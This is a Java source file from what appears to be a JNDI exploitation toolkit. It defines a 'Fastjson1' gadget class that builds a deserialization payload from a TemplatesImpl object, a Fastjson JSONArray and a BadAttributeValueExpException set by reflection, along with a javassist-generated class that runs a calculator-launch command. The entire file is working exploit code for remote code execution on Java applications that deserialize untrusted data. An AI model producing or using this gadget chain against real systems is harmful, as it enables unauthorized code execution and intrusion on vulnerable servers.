package com.nu1r.jndi.gadgets;

import com.alibaba.fastjson.JSONArray;
import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.ObjectPayload;
import com.nu1r.jndi.gadgets.utils.Gadgets;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;

public class Fastjson1 implements ObjectPayload<Object> {
    @Override
    public Object getObject(PayloadType type, String... param) throws Exception {
        ClassPool pool       = ClassPool.getDefault();
        CtClass   clazz      = pool.makeClass("a");
        CtClass   superClass = pool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
        constructor.setBody("Runtime.getRuntime().exec(\"open -na Calculator\");");
        clazz.addConstructor(constructor);
        Object templates = Gadgets.createTemplatesImpl(type,param);


        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templates);

        BadAttributeValueExpException val      = new BadAttributeValueExpException(null);
        Field                         valfield = val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, jsonArray);
        return val;
    }
}
